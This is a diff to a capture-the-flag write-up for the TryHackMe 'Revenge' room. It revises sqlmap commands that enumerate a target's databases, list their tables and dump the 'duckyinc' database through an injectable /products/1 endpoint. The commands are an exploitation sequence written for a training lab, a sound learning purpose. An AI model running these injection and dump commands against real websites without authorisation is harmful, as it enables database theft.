@@ -7,10 +7,14 @@ in the CTF by THM named Revenge, i found such a directory named /products. the p
 ```bash
 sqlmap -u http://<target_ip>/products/1 --dbs
 ```
-in this manner, the database of the website were enumerated
-
-now for fetching the contents of the database, use the following command:
+in this manner, the databases of the website were enumerated
 
 ```bash
-sqlmap -u http://<target_ip>/products/1 --batch -D <table_name> --tables
+sqlmap -u http://<target_ip>/products/1 --batch -D <database_name> --tables
 ```
+here you can find the existing tables of the databases. 
+
+```bash
+sqlmap -u http://<target_ip>/products/1 --batch -D duckyinc --dump
+```
+by simply swapping the --tables flag with the --dump flag, the contents of those tables would be dumped
